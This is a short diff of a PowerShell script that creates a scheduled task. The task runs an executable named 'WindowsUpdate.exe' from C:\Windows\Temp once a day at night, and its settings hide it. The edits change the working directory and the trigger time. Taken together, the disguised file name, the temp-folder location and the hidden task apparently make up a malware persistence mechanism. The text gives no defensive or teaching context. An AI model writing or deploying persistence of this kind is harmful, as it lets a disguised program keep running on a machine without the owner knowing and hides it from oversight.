@@ -4,12 +4,13 @@ echo [+] Creating Task...
 
 #action
 $taskAction = New-ScheduledTaskAction `
-    -Execute 'C:\Windows\Temp\WindowsUpdate.exe'
+    -Execute 'WindowsUpdate.exe' `
+    -WorkingDirectory "C:\Windows\Temp"
 
 #triggering
 $trigger = New-ScheduledTaskTrigger `
     -Daily `
-    -At 9:45PM 
+    -At 9:55PM 
 
 $settings = New-ScheduledTaskSettingsSet `
     -Hidden `
